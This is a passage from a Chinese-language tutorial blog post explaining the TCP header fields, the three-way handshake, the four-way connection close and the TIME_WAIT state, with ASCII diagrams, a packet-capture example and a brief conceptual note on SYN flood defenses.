class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></code></pre></td></tr></table></figure><h3 id="2-3-字段详解"><a href="#2-3-字段详解" class="headerlink" title="2.3 字段详解"></a>2.3 字段详解</h3><p><strong>1. 源端口和目标端口（各16位）</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs makefile">用途：标识发送方和接收方的应用进程<br><br>示例：<br><span class="hljs-section">源端口: 54321 (客户端随机端口)</span><br><span class="hljs-section">目标端口: 80 (HTTP服务器端口)</span><br></code></pre></td></tr></table></figure><p><strong>2. 序列号（Sequence Number，32位）</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">作用：<br><span class="hljs-bullet">- </span>标识发送的数据字节流中的位置<br><span class="hljs-bullet">- </span>确保数据按序到达<br><span class="hljs-bullet">- </span>范围：0 ~ 4,294,967,295<br><br>示例：<br>第1个TCP段：SEQ = 1000，数据长度100字节<br>第2个TCP段：SEQ = 1100 (1000 + 100)<br>第3个TCP段：SEQ = 1200<br></code></pre></td></tr></table></figure><p><strong>3. 确认号（Acknowledgment Number，32位）</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">作用：<br><span class="hljs-bullet">- </span>期望收到的下一个字节的序列号<br><span class="hljs-bullet">- </span>ACK=1000 表示&quot;我已收到999及之前的所有数据，期望收到1000&quot;<br><br>特点：<br><span class="hljs-bullet">- </span>累积确认（确认号之前的所有数据都已收到）<br></code></pre></td></tr></table></figure><p><strong>4. 头部长度（4位）</strong></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">单位：<span class="hljs-number">32</span>位字（<span class="hljs-number">4</span>字节）<br>范围：<span class="hljs-number">5</span>-<span class="hljs-number">15</span>（表示<span class="hljs-number">20</span>-<span class="hljs-number">60</span>字节）<br><br>最小值：<span class="hljs-number">5</span> × <span class="hljs-number">4</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>字节（无选项）<br>最大值：<span class="hljs-number">15</span> × <span class="hljs-number">4</span> <span class="hljs-operator">=</span> <span class="hljs-number">60</span>字节（<span class="hljs-number">40</span>字节选项）<br></code></pre></td></tr></table></figure><p><strong>5. 保留位（3位）</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">保留未来使用，必须置0<br></code></pre></td></tr></table></figure><p><strong>6. 控制标志位（9位）</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs markdown">最重要的6个标志：<br><br><span class="hljs-bullet">1.</span> URG (Urgent，紧急)<br><span class="hljs-bullet">   -</span> URG=1 表示紧急指针有效<br><span class="hljs-bullet">   -</span> 很少使用<br><br><span class="hljs-bullet">2.</span> ACK (Acknowledgment，确认)<br><span class="hljs-bullet">   -</span> ACK=1 表示确认号有效<br><span class="hljs-bullet">   -</span> 除了第一个SYN包，其他都是1<br><br><span class="hljs-bullet">3.</span> PSH (Push，推送)<br><span class="hljs-bullet">   -</span> PSH=1 要求立即推送数据给应用层<br><span class="hljs-bullet">   -</span> 不要缓冲<br><br><span class="hljs-bullet">4.</span> RST (Reset，重置)<br><span class="hljs-bullet">   -</span> RST=1 重置连接<br><span class="hljs-bullet">   -</span> 用于异常关闭或拒绝连接<br><br><span class="hljs-bullet">5.</span> SYN (Synchronize，同步)<br><span class="hljs-bullet">   -</span> SYN=1 请求建立连接<br><span class="hljs-bullet">   -</span> 用于三次握手<br><br><span class="hljs-bullet">6.</span> FIN (Finish，结束)<br><span class="hljs-bullet">   -</span> FIN=1 请求关闭连接<br><span class="hljs-bullet">   -</span> 用于四次挥手<br><br>其他3个（较新）：<br><span class="hljs-bullet">-</span> CWR: Congestion Window Reduced (拥塞窗口减少)<br><span class="hljs-bullet">-</span> ECE: ECN Echo (显式拥塞通知回显)<br><span class="hljs-bullet">-</span> NS: Nonce Sum (随机数和)<br></code></pre></td></tr></table></figure><p><strong>7. 窗口大小（16位）</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs makefile">作用：流量控制<br>含义：告诉对方自己的接收缓冲区还能接收多少字节<br><br>范围：0 ~ 65535 字节<br>窗口=0 表示<span class="hljs-string">&quot;暂停发送，我的缓冲区满了&quot;</span><br><br>示例：<br>Window = 8192 → <span class="hljs-string">&quot;我最多还能接收8KB数据&quot;</span><br></code></pre></td></tr></table></figure><p><strong>8. 校验和（16位）</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">作用：检测TCP段在传输过程中是否出错<br><br>计算范围：<br><span class="hljs-bullet">- </span>TCP伪头部（来自IP层）<br><span class="hljs-bullet">- </span>TCP头部<br><span class="hljs-bullet">- </span>TCP数据<br><br>如果校验失败 → 丢弃该段<br></code></pre></td></tr></table></figure><p><strong>9. 紧急指针（16位）</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">仅当<span class="hljs-attribute">URG</span>=1时有效<br>指向紧急数据的最后一个字节<br><br>很少使用<br></code></pre></td></tr></table></figure><p><strong>10. 选项（可变长度）</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs markdown">常用选项：<br><br><span class="hljs-bullet">1.</span> MSS (Maximum Segment Size，最大段大小)<br><span class="hljs-bullet">   -</span> 选项类型: 2<br><span class="hljs-bullet">   -</span> 长度: 4字节<br><span class="hljs-bullet">   -</span> 表示愿意接收的最大TCP段大小<br><span class="hljs-bullet">   -</span> 通常在SYN包中协商<br><br><span class="hljs-bullet">2.</span> Window Scale (窗口扩大因子)<br><span class="hljs-bullet">   -</span> 选项类型: 3<br><span class="hljs-bullet">   -</span> 长度: 3字节<br><span class="hljs-bullet">   -</span> 扩大窗口大小（突破65535限制）<br><span class="hljs-bullet">   -</span> 实际窗口 = Window × 2^Scale<br><br><span class="hljs-bullet">3.</span> Timestamps (时间戳)<br><span class="hljs-bullet">   -</span> 选项类型: 8<br><span class="hljs-bullet">   -</span> 长度: 10字节<br><span class="hljs-bullet">   -</span> 用于计算RTT和防止序列号回绕<br><br><span class="hljs-bullet">4.</span> SACK (Selective Acknowledgment，选择性确认)<br><span class="hljs-bullet">   -</span> 选项类型: 5<br><span class="hljs-bullet">   -</span> 允许确认不连续的数据块<br></code></pre></td></tr></table></figure><hr><h2 id="3-TCP三次握手"><a href="#3-TCP三次握手" class="headerlink" title="3. TCP三次握手"></a>3. TCP三次握手</h2><h3 id="3-1-为什么需要三次握手？"><a href="#3-1-为什么需要三次握手？" class="headerlink" title="3.1 为什么需要三次握手？"></a>3.1 为什么需要三次握手？</h3><p><strong>目的</strong>：</p><ol><li>确认双方的发送和接收能力都正常</li><li>协商初始序列号（ISN）</li><li>协商连接参数（MSS、窗口大小等）</li></ol><p><strong>为什么不是两次或四次？</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">两次握手的问题：<br><span class="hljs-bullet">- </span>客户端发送SYN<br><span class="hljs-bullet">- </span>服务器回复SYN+ACK<br>❌ 服务器不知道客户端是否收到SYN+ACK<br>❌ 可能导致半开连接（服务器以为连接建立，客户端不知道）<br>❌ 旧的重复SYN可能导致资源浪费<br><br>三次握手刚好：<br>✅ 确认双方都能发送和接收<br>✅ 防止旧连接的初始化<br>✅ 资源开销合理<br><br>四次握手：<br>⚠️ 没必要，增加延迟<br></code></pre></td></tr></table></figure><h3 id="3-2-三次握手详细过程"><a href="#3-2-三次握手详细过程" class="headerlink" title="3.2 三次握手详细过程"></a>3.2 三次握手详细过程</h3><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">客户端                                          服务器<br>CLOSED                                          LISTEN<br>  |<span class="hljs-string">                                                </span>|<br>  |<span class="hljs-string">  ① SYN=1, SEQ=x                               </span>|<br>  |<span class="hljs-string">  &quot;你好，我想建立连接，我的初始序列号是x&quot;        </span>|<br>  |<span class="hljs-string">─────────────────────────────────────────────&gt;</span>|<br>  |<span class="hljs-string">                                                </span>|<br>SYN_SENT                                          |<span class="hljs-string"></span><br><span class="hljs-string">  </span>|<span class="hljs-string">                                                </span>|<br>  |<span class="hljs-string">  ② SYN=1, ACK=1, SEQ=y, ACK_NUM=x+1           </span>|<br>  |<span class="hljs-string">  &quot;好的，我同意。我的初始序列号是y，确认收到x&quot;   </span>|<br>  |<span class="hljs-string">&lt;─────────────────────────────────────────────</span>|<br>  |<span class="hljs-string">                                          SYN_RCVD</span><br><span class="hljs-string">  </span>|<span class="hljs-string">                                                </span>|<br>  |<span class="hljs-string">  ③ ACK=1, SEQ=x+1, ACK_NUM=y+1                </span>|<br>  |<span class="hljs-string">  &quot;收到，我们开始通信吧！&quot;                       </span>|<br>  |<span class="hljs-string">─────────────────────────────────────────────&gt;</span>|<br>  |<span class="hljs-string">                                                </span>|<br>ESTABLISHED                              ESTABLISHED<br>  |<span class="hljs-string">                                                </span>|<br>  |<span class="hljs-string">            数据传输...                         </span>|<br>  |<span class="hljs-string">&lt;─────────────────────────────────────────────&gt;</span>|<br></code></pre></td></tr></table></figure><p><strong>第一次握手（客户端 → 服务器）</strong>：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs abnf">TCP标志：SYN <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br>序列号：  SEQ <span class="hljs-operator">=</span> x (客户端随机选择的ISN)<br>确认号：  无效（ACK<span class="hljs-operator">=</span><span class="hljs-number">0</span>）<br><br>客户端状态：CLOSED → SYN_SENT<br>服务器状态：LISTEN（保持不变）<br><br>作用：<br>- 客户端告诉服务器：<span class="hljs-string">&quot;我想建立连接&quot;</span><br>- 告诉服务器客户端的初始序列号<br></code></pre></td></tr></table></figure><p><strong>第二次握手（服务器 → 客户端）</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">TCP标志：SYN = 1, ACK = 1<br>序列号：  SEQ = y (服务器随机选择的ISN)<br>确认号：  ACK_NUM = x + 1<br><br>客户端状态：SYN<span class="hljs-emphasis">_SENT（保持不变）</span><br><span class="hljs-emphasis">服务器状态：LISTEN → SYN_</span>RCVD<br><br>作用：<br><span class="hljs-bullet">- </span>服务器告诉客户端：&quot;我同意建立连接&quot;<br><span class="hljs-bullet">- </span>告诉客户端服务器的初始序列号<br><span class="hljs-bullet">- </span>确认收到了客户端的SYN（ACK=x+1）<br></code></pre></td></tr></table></figure><p><strong>第三次握手（客户端 → 服务器）</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">TCP标志：ACK = 1<br>序列号：  SEQ = x + 1<br>确认号：  ACK_NUM = y + 1<br><br>客户端状态：SYN<span class="hljs-emphasis">_SENT → ESTABLISHED ✅</span><br><span class="hljs-emphasis">服务器状态：SYN_</span>RCVD → ESTABLISHED ✅<br><br>作用：<br><span class="hljs-bullet">- </span>客户端确认收到服务器的SYN+ACK<br><span class="hljs-bullet">- </span>双方进入ESTABLISHED状态，可以开始传输数据<br></code></pre></td></tr></table></figure><h3 id="3-3-三次握手抓包示例"><a href="#3-3-三次握手抓包示例" class="headerlink" title="3.3 三次握手抓包示例"></a>3.3 三次握手抓包示例</h3><p><strong>Wireshark抓包分析</strong>：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">第1个包：客户端 → 服务器<br>TCP 54321 → 80 [SYN] <span class="hljs-attribute">Seq</span>=0 <span class="hljs-attribute">Win</span>=65535 <span class="hljs-attribute">Len</span>=0 <span class="hljs-attribute">MSS</span>=1460<br><br>第2个包：服务器 → 客户端<br>TCP 80 → 54321 [SYN, ACK] <span class="hljs-attribute">Seq</span>=0 <span class="hljs-attribute">Ack</span>=1 <span class="hljs-attribute">Win</span>=29200 <span class="hljs-attribute">Len</span>=0 <span class="hljs-attribute">MSS</span>=1460<br><br>第3个包：客户端 → 服务器<br>TCP 54321 → 80 [ACK] <span class="hljs-attribute">Seq</span>=1 <span class="hljs-attribute">Ack</span>=1 <span class="hljs-attribute">Win</span>=65535 <span class="hljs-attribute">Len</span>=0<br><br>✅ 连接建立成功<br></code></pre></td></tr></table></figure><h3 id="3-4-三次握手的常见问题"><a href="#3-4-三次握手的常见问题" class="headerlink" title="3.4 三次握手的常见问题"></a>3.4 三次握手的常见问题</h3><p><strong>Q1：第三次握手失败会怎样？</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs markdown">情况：<br><span class="hljs-bullet">-</span> 客户端发送第三次ACK<br><span class="hljs-bullet">-</span> ACK在网络中丢失，服务器没收到<br><br>服务器行为：<br><span class="hljs-bullet">1.</span> 服务器仍然处于SYN<span class="hljs-emphasis">_RCVD状态</span><br><span class="hljs-emphasis">2. 等待超时后重传SYN+ACK</span><br><span class="hljs-emphasis">3. 重传几次后（默认5次）放弃，关闭连接</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">客户端行为：</span><br><span class="hljs-emphasis">1. 客户端已进入ESTABLISHED状态</span><br><span class="hljs-emphasis">2. 可以发送数据</span><br><span class="hljs-emphasis">3. 服务器收到数据包（含ACK）后也进入ESTABLISHED</span><br></code></pre></td></tr></table></figure><p><strong>Q2：SYN洪水攻击（SYN Flood）是什么？</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">攻击原理：<br>1. 攻击者发送大量SYN请求<br>2. 使用伪造的源IP地址<br>3. 服务器回复SYN+ACK到不存在的地址<br>4. 服务器维护大量半开连接（SYN_RCVD状态）<br>5. 耗尽服务器资源<br><br>防护措施：<br><span class="hljs-bullet">- </span>SYN Cookie技术<br><span class="hljs-bullet">- </span>限制SYN请求速率<br><span class="hljs-bullet">- </span>减少超时时间<br><span class="hljs-bullet">- </span>增加半连接队列大小<br></code></pre></td></tr></table></figure><hr><h2 id="4-TCP四次挥手"><a href="#4-TCP四次挥手" class="headerlink" title="4. TCP四次挥手"></a>4. TCP四次挥手</h2><h3 id="4-1-为什么需要四次挥手？"><a href="#4-1-为什么需要四次挥手？" class="headerlink" title="4.1 为什么需要四次挥手？"></a>4.1 为什么需要四次挥手？</h3><p><strong>核心原因</strong>：TCP是<strong>全双工</strong>通信，双方都需要独立关闭自己的发送通道。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs 1c">建立连接：握手（单向，一起建立）<br>关闭连接：挥手（双向，独立关闭）<br><br>类比：<br>建立电话：双方同时准备好就行<br>挂断电话：每个人都要说<span class="hljs-string">&quot;再见&quot;</span>并确认<br></code></pre></td></tr></table></figure><h3 id="4-2-四次挥手详细过程"><a href="#4-2-四次挥手详细过程" class="headerlink" title="4.2 四次挥手详细过程"></a>4.2 四次挥手详细过程</h3><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">客户端                                          服务器<br>ESTABLISHED                              ESTABLISHED<br>  |<span class="hljs-string">                                                </span>|<br>  |<span class="hljs-string">  ① FIN=1, SEQ=u                               </span>|<br>  |<span class="hljs-string">  &quot;我没有数据要发送了，准备关闭&quot;                 </span>|<br>  |<span class="hljs-string">─────────────────────────────────────────────&gt;</span>|<br>  |<span class="hljs-string">                                                </span>|<br>FIN_WAIT_1                                        |<span class="hljs-string"></span><br><span class="hljs-string">  </span>|<span class="hljs-string">                                                </span>|<br>  |<span class="hljs-string">  ② ACK=1, SEQ=v, ACK_NUM=u+1                  </span>|<br>  |<span class="hljs-string">  &quot;好的，我知道了。但我可能还有数据要发送&quot;        </span>|<br>  |<span class="hljs-string">&lt;─────────────────────────────────────────────</span>|<br>  |<span class="hljs-string">                                          CLOSE_WAIT</span><br><span class="hljs-string">FIN_WAIT_2                                        </span>|<br>  |<span class="hljs-string">                                                </span>|<br>  |<span class="hljs-string">            服务器继续发送数据...                </span>|<br>  |<span class="hljs-string">&lt;─────────────────────────────────────────────</span>|<br>  |<span class="hljs-string">                                                </span>|<br>  |<span class="hljs-string">  ③ FIN=1, ACK=1, SEQ=w, ACK_NUM=u+1           </span>|<br>  |<span class="hljs-string">  &quot;好了，我的数据也发送完了，可以关闭了&quot;          </span>|<br>  |<span class="hljs-string">&lt;─────────────────────────────────────────────</span>|<br>  |<span class="hljs-string">                                          LAST_ACK</span><br><span class="hljs-string">TIME_WAIT                                         </span>|<br>  |<span class="hljs-string">                                                </span>|<br>  |<span class="hljs-string">  ④ ACK=1, SEQ=u+1, ACK_NUM=w+1                </span>|<br>  |<span class="hljs-string">  &quot;收到，再见！&quot;                                </span>|<br>  |<span class="hljs-string">─────────────────────────────────────────────&gt;</span>|<br>  |<span class="hljs-string">                                                </span>|<br>  |<span class="hljs-string">                                            CLOSED</span><br><span class="hljs-string">  </span>|<span class="hljs-string">  (等待2MSL时间)                               </span>|<br>  |<span class="hljs-string">                                                </span>|<br>CLOSED                                            |<br></code></pre></td></tr></table></figure><p><strong>第一次挥手（客户端 → 服务器）</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">TCP标志：FIN = 1, ACK = 1<br>序列号：  SEQ = u<br>确认号：  ACK_NUM = v<br><br>客户端状态：ESTABLISHED → FIN_WAIT_1<br>服务器状态：ESTABLISHED（保持不变）<br><br>含义：<br><span class="hljs-bullet">- </span>客户端告诉服务器：&quot;我没有数据要发送了&quot;<br><span class="hljs-bullet">- </span>客户端进入主动关闭状态<br><span class="hljs-bullet">- </span>但客户端仍可以接收数据<br></code></pre></td></tr></table></figure><p><strong>第二次挥手（服务器 → 客户端）</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">TCP标志：ACK = 1<br>序列号：  SEQ = v<br>确认号：  ACK_NUM = u + 1<br><br>客户端状态：FIN<span class="hljs-emphasis">_WAIT_1 → FIN_WAIT_2</span><br><span class="hljs-emphasis">服务器状态：ESTABLISHED → CLOSE_</span>WAIT<br><br>含义：<br><span class="hljs-bullet">- </span>服务器确认收到客户端的FIN<br><span class="hljs-bullet">- </span>服务器可能还有数据要发送<br><span class="hljs-bullet">- </span>服务器到客户端的方向还未关闭<br></code></pre></td></tr></table></figure><p><strong>第三次挥手（服务器 → 客户端）</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">TCP标志：FIN = 1, ACK = 1<br>序列号：  SEQ = w<br>确认号：  ACK_NUM = u + 1<br><br>客户端状态：FIN<span class="hljs-emphasis">_WAIT_2（保持不变）</span><br><span class="hljs-emphasis">服务器状态：CLOSE_WAIT → LAST_</span>ACK<br><br>含义：<br><span class="hljs-bullet">- </span>服务器数据发送完毕<br><span class="hljs-bullet">- </span>服务器请求关闭连接<br><span class="hljs-bullet">- </span>等待客户端最后的确认<br></code></pre></td></tr></table></figure><p><strong>第四次挥手（客户端 → 服务器）</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">TCP标志：ACK = 1<br>序列号：  SEQ = u + 1<br>确认号：  ACK_NUM = w + 1<br><br>客户端状态：FIN<span class="hljs-emphasis">_WAIT_2 → TIME_WAIT → CLOSED</span><br><span class="hljs-emphasis">服务器状态：LAST_</span>ACK → CLOSED ✅<br><br>含义：<br><span class="hljs-bullet">- </span>客户端确认收到服务器的FIN<br><span class="hljs-bullet">- </span>服务器收到后立即关闭<br><span class="hljs-bullet">- </span>客户端等待2MSL时间后关闭<br></code></pre></td></tr></table></figure><h3 id="4-3-TIME-WAIT状态"><a href="#4-3-TIME-WAIT状态" class="headerlink" title="4.3 TIME_WAIT状态"></a>4.3 TIME_WAIT状态</h3><p><strong>为什么需要TIME_WAIT？</strong></p><p>客户端在发送最后一个ACK后不立即关闭，而是等待**2MSL（Maximum Segment Lifetime）**时间。</p><p><strong>原因1：确保最后的ACK被服务器收到</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs markdown">场景：<br><span class="hljs-bullet">1.</span> 客户端发送最后的ACK<br><span class="hljs-bullet">2.</span> ACK在网络中丢失<br><span class="hljs-bullet">3.</span> 服务器超时重传FIN<br><span class="hljs-bullet">4.</span> 如果客户端已关闭，无法响应<br><span class="hljs-bullet">5.</span> 服务器会认为连接异常<br><br>解决：<br>客户端等待2MSL<br>如果收到重传的FIN，重新发送ACK<br></code></pre></td></tr></table></figure><p><strong>原因2：确保旧连接的数据包消失</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown">场景：<br><span class="hljs-bullet">1.</span> 旧连接关闭<br><span class="hljs-bullet">2.</span> 立即用相同的四元组建立新连接<br><span class="hljs-bullet">3.</span> 旧连接的延迟数据包到达<br><span class="hljs-bullet">4.</span> 新连接收到旧数据，导致混乱<br><br>解决：<br>等待2MSL，确保所有数据包都消失<br>(1 MSL去程 + 1 MSL回程)<br></code></pre></td></tr></table></figure><p><strong>MSL时间</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">RFC定义：2分钟<br>Linux默认：60秒（可调整）<br>Windows：4分钟<br><br>2MSL：<br><span class="hljs-bullet">- </span>Linux: 120秒<br><span class="hljs-bullet">- </span>Windows: 240秒<br></code></pre></td></tr></table></figure><p><strong>TIME_WAIT过多的问题</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">现象：<br>netstat -an | grep TIME<span class="hljs-emphasis">_WAIT | wc -l</span><br><span class="hljs-emphasis">显示大量TIME_</span>WAIT连接<br><br>影响：<br><span class="hljs-bullet">- </span>占用端口（客户端端口有限）<br><span class="hljs-bullet">- </span>占用系统资源<br><br>解决方案：<br>1. 启用SO<span class="hljs-emphasis">_REUSEADDR选项</span><br><span class="hljs-emphasis">2. 调整内核参数：</span><br><span class="hljs-emphasis">   net.ipv4.tcp_tw_reuse = 1</span><br><span class="hljs-emphasis">   